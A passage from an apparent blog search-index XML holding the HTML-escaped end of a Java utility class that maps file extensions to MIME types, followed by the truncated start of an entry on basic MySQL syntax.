      type.put(&quot;prc&quot;, &quot;application&#x2F;x-mobipocket-ebook&quot;);
      type.put(&quot;mobi&quot;, &quot;application&#x2F;x-mobipocket-ebook&quot;);
      type.put(&quot;application&quot;, &quot;application&#x2F;x-ms-application&quot;);
      type.put(&quot;lnk&quot;, &quot;application&#x2F;x-ms-shortcut&quot;);
      type.put(&quot;wmd&quot;, &quot;application&#x2F;x-ms-wmd&quot;);
      type.put(&quot;wmz&quot;, &quot;application&#x2F;x-ms-wmz&quot;);
      type.put(&quot;xbap&quot;, &quot;application&#x2F;x-ms-xbap&quot;);
      type.put(&quot;mdb&quot;, &quot;application&#x2F;x-msaccess&quot;);
      type.put(&quot;obd&quot;, &quot;application&#x2F;x-msbinder&quot;);
      type.put(&quot;crd&quot;, &quot;application&#x2F;x-mscardfile&quot;);
      type.put(&quot;clp&quot;, &quot;application&#x2F;x-msclip&quot;);
      type.put(&quot;exe&quot;, &quot;application&#x2F;x-msdownload&quot;);
      type.put(&quot;dll&quot;, &quot;application&#x2F;x-msdownload&quot;);
      type.put(&quot;com&quot;, &quot;application&#x2F;x-msdownload&quot;);
      type.put(&quot;bat&quot;, &quot;application&#x2F;x-msdownload&quot;);
      type.put(&quot;msi&quot;, &quot;application&#x2F;x-msdownload&quot;);
      type.put(&quot;mvb&quot;, &quot;application&#x2F;x-msmediaview&quot;);
      type.put(&quot;m13&quot;, &quot;application&#x2F;x-msmediaview&quot;);
      type.put(&quot;m14&quot;, &quot;application&#x2F;x-msmediaview&quot;);
      type.put(&quot;wmf&quot;, &quot;application&#x2F;x-msmetafile&quot;);
      type.put(&quot;wmz&quot;, &quot;application&#x2F;x-msmetafile&quot;);
      type.put(&quot;emf&quot;, &quot;application&#x2F;x-msmetafile&quot;);
      type.put(&quot;emz&quot;, &quot;application&#x2F;x-msmetafile&quot;);
      type.put(&quot;mny&quot;, &quot;application&#x2F;x-msmoney&quot;);
      type.put(&quot;pub&quot;, &quot;application&#x2F;x-mspublisher&quot;);
      type.put(&quot;scd&quot;, &quot;application&#x2F;x-msschedule&quot;);
      type.put(&quot;trm&quot;, &quot;application&#x2F;x-msterminal&quot;);
      type.put(&quot;wri&quot;, &quot;application&#x2F;x-mswrite&quot;);
      type.put(&quot;nc&quot;, &quot;application&#x2F;x-netcdf&quot;);
      type.put(&quot;cdf&quot;, &quot;application&#x2F;x-netcdf&quot;);
      type.put(&quot;nzb&quot;, &quot;application&#x2F;x-nzb&quot;);
      type.put(&quot;p12&quot;, &quot;application&#x2F;x-pkcs12&quot;);
      type.put(&quot;pfx&quot;, &quot;application&#x2F;x-pkcs12&quot;);
      type.put(&quot;p7b&quot;, &quot;application&#x2F;x-pkcs7-certificates&quot;);
      type.put(&quot;spc&quot;, &quot;application&#x2F;x-pkcs7-certificates&quot;);
      type.put(&quot;p7r&quot;, &quot;application&#x2F;x-pkcs7-certreqresp&quot;);
      type.put(&quot;rar&quot;, &quot;application&#x2F;x-rar-compressed&quot;);
      type.put(&quot;ris&quot;, &quot;application&#x2F;x-research-info-systems&quot;);
      type.put(&quot;sh&quot;, &quot;application&#x2F;x-sh&quot;);
      type.put(&quot;shar&quot;, &quot;application&#x2F;x-shar&quot;);
      type.put(&quot;swf&quot;, &quot;application&#x2F;x-shockwave-flash&quot;);
      type.put(&quot;xap&quot;, &quot;application&#x2F;x-silverlight-app&quot;);
      type.put(&quot;sql&quot;, &quot;application&#x2F;x-sql&quot;);
      type.put(&quot;sit&quot;, &quot;application&#x2F;x-stuffit&quot;);
      type.put(&quot;sitx&quot;, &quot;application&#x2F;x-stuffitx&quot;);
      type.put(&quot;srt&quot;, &quot;application&#x2F;x-subrip&quot;);
      type.put(&quot;sv4cpio&quot;, &quot;application&#x2F;x-sv4cpio&quot;);
      type.put(&quot;sv4crc&quot;, &quot;application&#x2F;x-sv4crc&quot;);
      type.put(&quot;t3&quot;, &quot;application&#x2F;x-t3vm-image&quot;);
      type.put(&quot;gam&quot;, &quot;application&#x2F;x-tads&quot;);
      type.put(&quot;tar&quot;, &quot;application&#x2F;x-tar&quot;);
      type.put(&quot;tcl&quot;, &quot;application&#x2F;x-tcl&quot;);
      type.put(&quot;tex&quot;, &quot;application&#x2F;x-tex&quot;);
      type.put(&quot;tfm&quot;, &quot;application&#x2F;x-tex-tfm&quot;);
      type.put(&quot;texinfo&quot;, &quot;application&#x2F;x-texinfo&quot;);
      type.put(&quot;texi&quot;, &quot;application&#x2F;x-texinfo&quot;);
      type.put(&quot;obj&quot;, &quot;application&#x2F;x-tgif&quot;);
      type.put(&quot;ustar&quot;, &quot;application&#x2F;x-ustar&quot;);
      type.put(&quot;src&quot;, &quot;application&#x2F;x-wais-source&quot;);
      type.put(&quot;webapp&quot;, &quot;application&#x2F;x-web-app-manifest+json&quot;);
      type.put(&quot;der&quot;, &quot;application&#x2F;x-x509-ca-cert&quot;);
      type.put(&quot;crt&quot;, &quot;application&#x2F;x-x509-ca-cert&quot;);
      type.put(&quot;fig&quot;, &quot;application&#x2F;x-xfig&quot;);
      type.put(&quot;xlf&quot;, &quot;application&#x2F;x-xliff+xml&quot;);
      type.put(&quot;xpi&quot;, &quot;application&#x2F;x-xpinstall&quot;);
      type.put(&quot;xz&quot;, &quot;application&#x2F;x-xz&quot;);
      type.put(&quot;z1&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z2&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z3&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z4&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z5&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z6&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z7&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;z8&quot;, &quot;application&#x2F;x-zmachine&quot;);
      type.put(&quot;xaml&quot;, &quot;application&#x2F;xaml+xml&quot;);
      type.put(&quot;xdf&quot;, &quot;application&#x2F;xcap-diff+xml&quot;);
      type.put(&quot;xenc&quot;, &quot;application&#x2F;xenc+xml&quot;);
      type.put(&quot;xhtml&quot;, &quot;application&#x2F;xhtml+xml&quot;);
      type.put(&quot;xht&quot;, &quot;application&#x2F;xhtml+xml&quot;);
      type.put(&quot;xml&quot;, &quot;application&#x2F;xml&quot;);
      type.put(&quot;xsl&quot;, &quot;application&#x2F;xml&quot;);
      type.put(&quot;xsd&quot;, &quot;application&#x2F;xml&quot;);
      type.put(&quot;dtd&quot;, &quot;application&#x2F;xml-dtd&quot;);
      type.put(&quot;xop&quot;, &quot;application&#x2F;xop+xml&quot;);
      type.put(&quot;xpl&quot;, &quot;application&#x2F;xproc+xml&quot;);
      type.put(&quot;xslt&quot;, &quot;application&#x2F;xslt+xml&quot;);
      type.put(&quot;xspf&quot;, &quot;application&#x2F;xspf+xml&quot;);
      type.put(&quot;mxml&quot;, &quot;application&#x2F;xv+xml&quot;);
      type.put(&quot;xhvml&quot;, &quot;application&#x2F;xv+xml&quot;);
      type.put(&quot;xvml&quot;, &quot;application&#x2F;xv+xml&quot;);
      type.put(&quot;xvm&quot;, &quot;application&#x2F;xv+xml&quot;);
      type.put(&quot;yang&quot;, &quot;application&#x2F;yang&quot;);
      type.put(&quot;yin&quot;, &quot;application&#x2F;yin+xml&quot;);
      type.put(&quot;zip&quot;, &quot;application&#x2F;zip&quot;);
      type.put(&quot;adp&quot;, &quot;audio&#x2F;adpcm&quot;);
      type.put(&quot;au&quot;, &quot;audio&#x2F;basic&quot;);
      type.put(&quot;snd&quot;, &quot;audio&#x2F;basic&quot;);
      type.put(&quot;mid&quot;, &quot;audio&#x2F;midi&quot;);
      type.put(&quot;midi&quot;, &quot;audio&#x2F;midi&quot;);
      type.put(&quot;kar&quot;, &quot;audio&#x2F;midi&quot;);
      type.put(&quot;rmi&quot;, &quot;audio&#x2F;midi&quot;);
      type.put(&quot;mp4a&quot;, &quot;audio&#x2F;mp4&quot;);
      type.put(&quot;m4a&quot;, &quot;audio&#x2F;mp4&quot;);
      type.put(&quot;mpga&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;mp2&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;mp2a&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;mp3&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;m2a&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;m3a&quot;, &quot;audio&#x2F;mpeg&quot;);
      type.put(&quot;oga&quot;, &quot;audio&#x2F;ogg&quot;);
      type.put(&quot;ogg&quot;, &quot;audio&#x2F;ogg&quot;);
      type.put(&quot;spx&quot;, &quot;audio&#x2F;ogg&quot;);
      type.put(&quot;s3m&quot;, &quot;audio&#x2F;s3m&quot;);
      type.put(&quot;sil&quot;, &quot;audio&#x2F;silk&quot;);
      type.put(&quot;uva&quot;, &quot;audio&#x2F;vnd.dece.audio&quot;);
      type.put(&quot;uvva&quot;, &quot;audio&#x2F;vnd.dece.audio&quot;);
      type.put(&quot;eol&quot;, &quot;audio&#x2F;vnd.digital-winds&quot;);
      type.put(&quot;dra&quot;, &quot;audio&#x2F;vnd.dra&quot;);
      type.put(&quot;dts&quot;, &quot;audio&#x2F;vnd.dts&quot;);
      type.put(&quot;dtshd&quot;, &quot;audio&#x2F;vnd.dts.hd&quot;);
      type.put(&quot;lvp&quot;, &quot;audio&#x2F;vnd.lucent.voice&quot;);
      type.put(&quot;pya&quot;, &quot;audio&#x2F;vnd.ms-playready.media.pya&quot;);
      type.put(&quot;ecelp4800&quot;, &quot;audio&#x2F;vnd.nuera.ecelp4800&quot;);
      type.put(&quot;ecelp7470&quot;, &quot;audio&#x2F;vnd.nuera.ecelp7470&quot;);
      type.put(&quot;ecelp9600&quot;, &quot;audio&#x2F;vnd.nuera.ecelp9600&quot;);
      type.put(&quot;rip&quot;, &quot;audio&#x2F;vnd.rip&quot;);
      type.put(&quot;weba&quot;, &quot;audio&#x2F;webm&quot;);
      type.put(&quot;aac&quot;, &quot;audio&#x2F;x-aac&quot;);
      type.put(&quot;aif&quot;, &quot;audio&#x2F;x-aiff&quot;);
      type.put(&quot;aiff&quot;, &quot;audio&#x2F;x-aiff&quot;);
      type.put(&quot;aifc&quot;, &quot;audio&#x2F;x-aiff&quot;);
      type.put(&quot;caf&quot;, &quot;audio&#x2F;x-caf&quot;);
      type.put(&quot;flac&quot;, &quot;audio&#x2F;x-flac&quot;);
      type.put(&quot;mka&quot;, &quot;audio&#x2F;x-matroska&quot;);
      type.put(&quot;m3u&quot;, &quot;audio&#x2F;x-mpegurl&quot;);
      type.put(&quot;wax&quot;, &quot;audio&#x2F;x-ms-wax&quot;);
      type.put(&quot;wma&quot;, &quot;audio&#x2F;x-ms-wma&quot;);
      type.put(&quot;ram&quot;, &quot;audio&#x2F;x-pn-realaudio&quot;);
      type.put(&quot;ra&quot;, &quot;audio&#x2F;x-pn-realaudio&quot;);
      type.put(&quot;rmp&quot;, &quot;audio&#x2F;x-pn-realaudio-plugin&quot;);
      type.put(&quot;wav&quot;, &quot;audio&#x2F;x-wav&quot;);
      type.put(&quot;xm&quot;, &quot;audio&#x2F;xm&quot;);
      type.put(&quot;cdx&quot;, &quot;chemical&#x2F;x-cdx&quot;);
      type.put(&quot;cif&quot;, &quot;chemical&#x2F;x-cif&quot;);
      type.put(&quot;cmdf&quot;, &quot;chemical&#x2F;x-cmdf&quot;);
      type.put(&quot;cml&quot;, &quot;chemical&#x2F;x-cml&quot;);
      type.put(&quot;csml&quot;, &quot;chemical&#x2F;x-csml&quot;);
      type.put(&quot;xyz&quot;, &quot;chemical&#x2F;x-xyz&quot;);
      type.put(&quot;otf&quot;, &quot;font&#x2F;opentype&quot;);
      type.put(&quot;bmp&quot;, &quot;image&#x2F;bmp&quot;);
      type.put(&quot;cgm&quot;, &quot;image&#x2F;cgm&quot;);
      type.put(&quot;g3&quot;, &quot;image&#x2F;g3fax&quot;);
      type.put(&quot;gif&quot;, &quot;image&#x2F;gif&quot;);
      type.put(&quot;ief&quot;, &quot;image&#x2F;ief&quot;);
      type.put(&quot;jpeg&quot;, &quot;image&#x2F;jpeg&quot;);
      type.put(&quot;jpg&quot;, &quot;image&#x2F;jpeg&quot;);
      type.put(&quot;jpe&quot;, &quot;image&#x2F;jpeg&quot;);
      type.put(&quot;ktx&quot;, &quot;image&#x2F;ktx&quot;);
      type.put(&quot;png&quot;, &quot;image&#x2F;png&quot;);
      type.put(&quot;btif&quot;, &quot;image&#x2F;prs.btif&quot;);
      type.put(&quot;sgi&quot;, &quot;image&#x2F;sgi&quot;);
      type.put(&quot;svg&quot;, &quot;image&#x2F;svg+xml&quot;);
      type.put(&quot;svgz&quot;, &quot;image&#x2F;svg+xml&quot;);
      type.put(&quot;tiff&quot;, &quot;image&#x2F;tiff&quot;);
      type.put(&quot;tif&quot;, &quot;image&#x2F;tiff&quot;);
      type.put(&quot;psd&quot;, &quot;image&#x2F;vnd.adobe.photoshop&quot;);
      type.put(&quot;uvi&quot;, &quot;image&#x2F;vnd.dece.graphic&quot;);
      type.put(&quot;uvvi&quot;, &quot;image&#x2F;vnd.dece.graphic&quot;);
      type.put(&quot;uvg&quot;, &quot;image&#x2F;vnd.dece.graphic&quot;);
      type.put(&quot;uvvg&quot;, &quot;image&#x2F;vnd.dece.graphic&quot;);
      type.put(&quot;djvu&quot;, &quot;image&#x2F;vnd.djvu&quot;);
      type.put(&quot;djv&quot;, &quot;image&#x2F;vnd.djvu&quot;);
      type.put(&quot;sub&quot;, &quot;image&#x2F;vnd.dvb.subtitle&quot;);
      type.put(&quot;dwg&quot;, &quot;image&#x2F;vnd.dwg&quot;);
      type.put(&quot;dxf&quot;, &quot;image&#x2F;vnd.dxf&quot;);
      type.put(&quot;fbs&quot;, &quot;image&#x2F;vnd.fastbidsheet&quot;);
      type.put(&quot;fpx&quot;, &quot;image&#x2F;vnd.fpx&quot;);
      type.put(&quot;fst&quot;, &quot;image&#x2F;vnd.fst&quot;);
      type.put(&quot;mmr&quot;, &quot;image&#x2F;vnd.fujixerox.edmics-mmr&quot;);
      type.put(&quot;rlc&quot;, &quot;image&#x2F;vnd.fujixerox.edmics-rlc&quot;);
      type.put(&quot;mdi&quot;, &quot;image&#x2F;vnd.ms-modi&quot;);
      type.put(&quot;wdp&quot;, &quot;image&#x2F;vnd.ms-photo&quot;);
      type.put(&quot;npx&quot;, &quot;image&#x2F;vnd.net-fpx&quot;);
      type.put(&quot;wbmp&quot;, &quot;image&#x2F;vnd.wap.wbmp&quot;);
      type.put(&quot;xif&quot;, &quot;image&#x2F;vnd.xiff&quot;);
      type.put(&quot;webp&quot;, &quot;image&#x2F;webp&quot;);
      type.put(&quot;3ds&quot;, &quot;image&#x2F;x-3ds&quot;);
      type.put(&quot;ras&quot;, &quot;image&#x2F;x-cmu-raster&quot;);
      type.put(&quot;cmx&quot;, &quot;image&#x2F;x-cmx&quot;);
      type.put(&quot;fh&quot;, &quot;image&#x2F;x-freehand&quot;);
      type.put(&quot;fhc&quot;, &quot;image&#x2F;x-freehand&quot;);
      type.put(&quot;fh4&quot;, &quot;image&#x2F;x-freehand&quot;);
      type.put(&quot;fh5&quot;, &quot;image&#x2F;x-freehand&quot;);
      type.put(&quot;fh7&quot;, &quot;image&#x2F;x-freehand&quot;);
      type.put(&quot;ico&quot;, &quot;image&#x2F;x-icon&quot;);
      type.put(&quot;sid&quot;, &quot;image&#x2F;x-mrsid-image&quot;);
      type.put(&quot;pcx&quot;, &quot;image&#x2F;x-pcx&quot;);
      type.put(&quot;pic&quot;, &quot;image&#x2F;x-pict&quot;);
      type.put(&quot;pct&quot;, &quot;image&#x2F;x-pict&quot;);
      type.put(&quot;pnm&quot;, &quot;image&#x2F;x-portable-anymap&quot;);
      type.put(&quot;pbm&quot;, &quot;image&#x2F;x-portable-bitmap&quot;);
      type.put(&quot;pgm&quot;, &quot;image&#x2F;x-portable-graymap&quot;);
      type.put(&quot;ppm&quot;, &quot;image&#x2F;x-portable-pixmap&quot;);
      type.put(&quot;rgb&quot;, &quot;image&#x2F;x-rgb&quot;);
      type.put(&quot;tga&quot;, &quot;image&#x2F;x-tga&quot;);
      type.put(&quot;xbm&quot;, &quot;image&#x2F;x-xbitmap&quot;);
      type.put(&quot;xpm&quot;, &quot;image&#x2F;x-xpixmap&quot;);
      type.put(&quot;xwd&quot;, &quot;image&#x2F;x-xwindowdump&quot;);
      type.put(&quot;eml&quot;, &quot;message&#x2F;rfc822&quot;);
      type.put(&quot;mime&quot;, &quot;message&#x2F;rfc822&quot;);
      type.put(&quot;igs&quot;, &quot;model&#x2F;iges&quot;);
      type.put(&quot;iges&quot;, &quot;model&#x2F;iges&quot;);
      type.put(&quot;msh&quot;, &quot;model&#x2F;mesh&quot;);
      type.put(&quot;mesh&quot;, &quot;model&#x2F;mesh&quot;);
      type.put(&quot;silo&quot;, &quot;model&#x2F;mesh&quot;);
      type.put(&quot;dae&quot;, &quot;model&#x2F;vnd.collada+xml&quot;);
      type.put(&quot;dwf&quot;, &quot;model&#x2F;vnd.dwf&quot;);
      type.put(&quot;gdl&quot;, &quot;model&#x2F;vnd.gdl&quot;);
      type.put(&quot;gtw&quot;, &quot;model&#x2F;vnd.gtw&quot;);
      type.put(&quot;mts&quot;, &quot;model&#x2F;vnd.mts&quot;);
      type.put(&quot;vtu&quot;, &quot;model&#x2F;vnd.vtu&quot;);
      type.put(&quot;wrl&quot;, &quot;model&#x2F;vrml&quot;);
      type.put(&quot;vrml&quot;, &quot;model&#x2F;vrml&quot;);
      type.put(&quot;x3db&quot;, &quot;model&#x2F;x3d+binary&quot;);
      type.put(&quot;x3dbz&quot;, &quot;model&#x2F;x3d+binary&quot;);
      type.put(&quot;x3dv&quot;, &quot;model&#x2F;x3d+vrml&quot;);
      type.put(&quot;x3dvz&quot;, &quot;model&#x2F;x3d+vrml&quot;);
      type.put(&quot;x3d&quot;, &quot;model&#x2F;x3d+xml&quot;);
      type.put(&quot;x3dz&quot;, &quot;model&#x2F;x3d+xml&quot;);
      type.put(&quot;appcache&quot;, &quot;text&#x2F;cache-manifest&quot;);
      type.put(&quot;manifest&quot;, &quot;text&#x2F;cache-manifest&quot;);
      type.put(&quot;ics&quot;, &quot;text&#x2F;calendar&quot;);
      type.put(&quot;ifb&quot;, &quot;text&#x2F;calendar&quot;);
      type.put(&quot;coffee&quot;, &quot;text&#x2F;coffeescript&quot;);
      type.put(&quot;css&quot;, &quot;text&#x2F;css&quot;);
      type.put(&quot;csv&quot;, &quot;text&#x2F;csv&quot;);
      type.put(&quot;hjson&quot;, &quot;text&#x2F;hjson&quot;);
      type.put(&quot;html&quot;, &quot;text&#x2F;html&quot;);
      type.put(&quot;htm&quot;, &quot;text&#x2F;html&quot;);
      type.put(&quot;jade&quot;, &quot;text&#x2F;jade&quot;);
      type.put(&quot;jsx&quot;, &quot;text&#x2F;jsx&quot;);
      type.put(&quot;less&quot;, &quot;text&#x2F;less&quot;);
      type.put(&quot;n3&quot;, &quot;text&#x2F;n3&quot;);
      type.put(&quot;txt&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;text&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;conf&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;def&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;list&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;log&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;in&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;ini&quot;, &quot;text&#x2F;plain&quot;);
      type.put(&quot;dsc&quot;, &quot;text&#x2F;prs.lines.tag&quot;);
      type.put(&quot;rtx&quot;, &quot;text&#x2F;richtext&quot;);
      type.put(&quot;sgml&quot;, &quot;text&#x2F;sgml&quot;);
      type.put(&quot;sgm&quot;, &quot;text&#x2F;sgml&quot;);
      type.put(&quot;stylus&quot;, &quot;text&#x2F;stylus&quot;);
      type.put(&quot;styl&quot;, &quot;text&#x2F;stylus&quot;);
      type.put(&quot;tsv&quot;, &quot;text&#x2F;tab-separated-values&quot;);
      type.put(&quot;t&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;tr&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;roff&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;man&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;me&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;ms&quot;, &quot;text&#x2F;troff&quot;);
      type.put(&quot;ttl&quot;, &quot;text&#x2F;turtle&quot;);
      type.put(&quot;uri&quot;, &quot;text&#x2F;uri-list&quot;);
      type.put(&quot;uris&quot;, &quot;text&#x2F;uri-list&quot;);
      type.put(&quot;urls&quot;, &quot;text&#x2F;uri-list&quot;);
      type.put(&quot;vcard&quot;, &quot;text&#x2F;vcard&quot;);
      type.put(&quot;curl&quot;, &quot;text&#x2F;vnd.curl&quot;);
      type.put(&quot;dcurl&quot;, &quot;text&#x2F;vnd.curl.dcurl&quot;);
      type.put(&quot;mcurl&quot;, &quot;text&#x2F;vnd.curl.mcurl&quot;);
      type.put(&quot;scurl&quot;, &quot;text&#x2F;vnd.curl.scurl&quot;);
      type.put(&quot;sub&quot;, &quot;text&#x2F;vnd.dvb.subtitle&quot;);
      type.put(&quot;fly&quot;, &quot;text&#x2F;vnd.fly&quot;);
      type.put(&quot;flx&quot;, &quot;text&#x2F;vnd.fmi.flexstor&quot;);
      type.put(&quot;gv&quot;, &quot;text&#x2F;vnd.graphviz&quot;);
      type.put(&quot;3dml&quot;, &quot;text&#x2F;vnd.in3d.3dml&quot;);
      type.put(&quot;spot&quot;, &quot;text&#x2F;vnd.in3d.spot&quot;);
      type.put(&quot;jad&quot;, &quot;text&#x2F;vnd.sun.j2me.app-descriptor&quot;);
      type.put(&quot;wml&quot;, &quot;text&#x2F;vnd.wap.wml&quot;);
      type.put(&quot;wmls&quot;, &quot;text&#x2F;vnd.wap.wmlscript&quot;);
      type.put(&quot;vtt&quot;, &quot;text&#x2F;vtt&quot;);
      type.put(&quot;s&quot;, &quot;text&#x2F;x-asm&quot;);
      type.put(&quot;asm&quot;, &quot;text&#x2F;x-asm&quot;);
      type.put(&quot;c&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;cc&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;cxx&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;cpp&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;h&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;hh&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;dic&quot;, &quot;text&#x2F;x-c&quot;);
      type.put(&quot;htc&quot;, &quot;text&#x2F;x-component&quot;);
      type.put(&quot;f&quot;, &quot;text&#x2F;x-fortran&quot;);
      type.put(&quot;for&quot;, &quot;text&#x2F;x-fortran&quot;);
      type.put(&quot;f77&quot;, &quot;text&#x2F;x-fortran&quot;);
      type.put(&quot;f90&quot;, &quot;text&#x2F;x-fortran&quot;);
      type.put(&quot;hbs&quot;, &quot;text&#x2F;x-handlebars-template&quot;);
      type.put(&quot;java&quot;, &quot;text&#x2F;x-java-source&quot;);
      type.put(&quot;lua&quot;, &quot;text&#x2F;x-lua&quot;);
      type.put(&quot;markdown&quot;, &quot;text&#x2F;x-markdown&quot;);
      type.put(&quot;md&quot;, &quot;text&#x2F;x-markdown&quot;);
      type.put(&quot;mkd&quot;, &quot;text&#x2F;x-markdown&quot;);
      type.put(&quot;nfo&quot;, &quot;text&#x2F;x-nfo&quot;);
      type.put(&quot;opml&quot;, &quot;text&#x2F;x-opml&quot;);
      type.put(&quot;p&quot;, &quot;text&#x2F;x-pascal&quot;);
      type.put(&quot;pas&quot;, &quot;text&#x2F;x-pascal&quot;);
      type.put(&quot;sass&quot;, &quot;text&#x2F;x-sass&quot;);
      type.put(&quot;scss&quot;, &quot;text&#x2F;x-scss&quot;);
      type.put(&quot;etx&quot;, &quot;text&#x2F;x-setext&quot;);
      type.put(&quot;sfv&quot;, &quot;text&#x2F;x-sfv&quot;);
      type.put(&quot;uu&quot;, &quot;text&#x2F;x-uuencode&quot;);
      type.put(&quot;vcs&quot;, &quot;text&#x2F;x-vcalendar&quot;);
      type.put(&quot;vcf&quot;, &quot;text&#x2F;x-vcard&quot;);
      type.put(&quot;yaml&quot;, &quot;text&#x2F;yaml&quot;);
      type.put(&quot;yml&quot;, &quot;text&#x2F;yaml&quot;);
      type.put(&quot;3gp&quot;, &quot;video&#x2F;3gpp&quot;);
      type.put(&quot;3g2&quot;, &quot;video&#x2F;3gpp2&quot;);
      type.put(&quot;h261&quot;, &quot;video&#x2F;h261&quot;);
      type.put(&quot;h263&quot;, &quot;video&#x2F;h263&quot;);
      type.put(&quot;h264&quot;, &quot;video&#x2F;h264&quot;);
      type.put(&quot;jpgv&quot;, &quot;video&#x2F;jpeg&quot;);
      type.put(&quot;jpm&quot;, &quot;video&#x2F;jpm&quot;);
      type.put(&quot;jpgm&quot;, &quot;video&#x2F;jpm&quot;);
      type.put(&quot;mj2&quot;, &quot;video&#x2F;mj2&quot;);
      type.put(&quot;mjp2&quot;, &quot;video&#x2F;mj2&quot;);
      type.put(&quot;ts&quot;, &quot;video&#x2F;mp2t&quot;);
      type.put(&quot;mp4&quot;, &quot;video&#x2F;mp4&quot;);
      type.put(&quot;mp4v&quot;, &quot;video&#x2F;mp4&quot;);
      type.put(&quot;mpg4&quot;, &quot;video&#x2F;mp4&quot;);
      type.put(&quot;mpeg&quot;, &quot;video&#x2F;mpeg&quot;);
      type.put(&quot;mpg&quot;, &quot;video&#x2F;mpeg&quot;);
      type.put(&quot;mpe&quot;, &quot;video&#x2F;mpeg&quot;);
      type.put(&quot;m1v&quot;, &quot;video&#x2F;mpeg&quot;);
      type.put(&quot;m2v&quot;, &quot;video&#x2F;mpeg&quot;);
      type.put(&quot;ogv&quot;, &quot;video&#x2F;ogg&quot;);
      type.put(&quot;qt&quot;, &quot;video&#x2F;quicktime&quot;);
      type.put(&quot;mov&quot;, &quot;video&#x2F;quicktime&quot;);
      type.put(&quot;uvh&quot;, &quot;video&#x2F;vnd.dece.hd&quot;);
      type.put(&quot;uvvh&quot;, &quot;video&#x2F;vnd.dece.hd&quot;);
      type.put(&quot;uvm&quot;, &quot;video&#x2F;vnd.dece.mobile&quot;);
      type.put(&quot;uvvm&quot;, &quot;video&#x2F;vnd.dece.mobile&quot;);
      type.put(&quot;uvp&quot;, &quot;video&#x2F;vnd.dece.pd&quot;);
      type.put(&quot;uvvp&quot;, &quot;video&#x2F;vnd.dece.pd&quot;);
      type.put(&quot;uvs&quot;, &quot;video&#x2F;vnd.dece.sd&quot;);
      type.put(&quot;uvvs&quot;, &quot;video&#x2F;vnd.dece.sd&quot;);
      type.put(&quot;uvv&quot;, &quot;video&#x2F;vnd.dece.video&quot;);
      type.put(&quot;uvvv&quot;, &quot;video&#x2F;vnd.dece.video&quot;);
      type.put(&quot;dvb&quot;, &quot;video&#x2F;vnd.dvb.file&quot;);
      type.put(&quot;fvt&quot;, &quot;video&#x2F;vnd.fvt&quot;);
      type.put(&quot;mxu&quot;, &quot;video&#x2F;vnd.mpegurl&quot;);
      type.put(&quot;m4u&quot;, &quot;video&#x2F;vnd.mpegurl&quot;);
      type.put(&quot;pyv&quot;, &quot;video&#x2F;vnd.ms-playready.media.pyv&quot;);
      type.put(&quot;uvu&quot;, &quot;video&#x2F;vnd.uvvu.mp4&quot;);
      type.put(&quot;uvvu&quot;, &quot;video&#x2F;vnd.uvvu.mp4&quot;);
      type.put(&quot;viv&quot;, &quot;video&#x2F;vnd.vivo&quot;);
      type.put(&quot;webm&quot;, &quot;video&#x2F;webm&quot;);
      type.put(&quot;f4v&quot;, &quot;video&#x2F;x-f4v&quot;);
      type.put(&quot;fli&quot;, &quot;video&#x2F;x-fli&quot;);
      type.put(&quot;flv&quot;, &quot;video&#x2F;x-flv&quot;);
      type.put(&quot;m4v&quot;, &quot;video&#x2F;x-m4v&quot;);
      type.put(&quot;mkv&quot;, &quot;video&#x2F;x-matroska&quot;);
      type.put(&quot;mk3d&quot;, &quot;video&#x2F;x-matroska&quot;);
      type.put(&quot;mks&quot;, &quot;video&#x2F;x-matroska&quot;);
      type.put(&quot;mng&quot;, &quot;video&#x2F;x-mng&quot;);
      type.put(&quot;asf&quot;, &quot;video&#x2F;x-ms-asf&quot;);
      type.put(&quot;asx&quot;, &quot;video&#x2F;x-ms-asf&quot;);
      type.put(&quot;vob&quot;, &quot;video&#x2F;x-ms-vob&quot;);
      type.put(&quot;wm&quot;, &quot;video&#x2F;x-ms-wm&quot;);
      type.put(&quot;wmv&quot;, &quot;video&#x2F;x-ms-wmv&quot;);
      type.put(&quot;wmx&quot;, &quot;video&#x2F;x-ms-wmx&quot;);
      type.put(&quot;wvx&quot;, &quot;video&#x2F;x-ms-wvx&quot;);
      type.put(&quot;avi&quot;, &quot;video&#x2F;x-msvideo&quot;);
      type.put(&quot;movie&quot;, &quot;video&#x2F;x-sgi-movie&quot;);
      type.put(&quot;smv&quot;, &quot;video&#x2F;x-smv&quot;);
      type.put(&quot;ice&quot;, &quot;x-conference&#x2F;x-cooltalk&quot;);
   &#125;

   public static String getMimeType(String fileExt) &#123;
      return type.get(fileExt);
   &#125;
&#125;
]]></content>
  </entry>
  <entry>
    <title>MySQL基础语法</title>
    <url>/2021/03/16/MySQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[连接# 命令行连接mysql
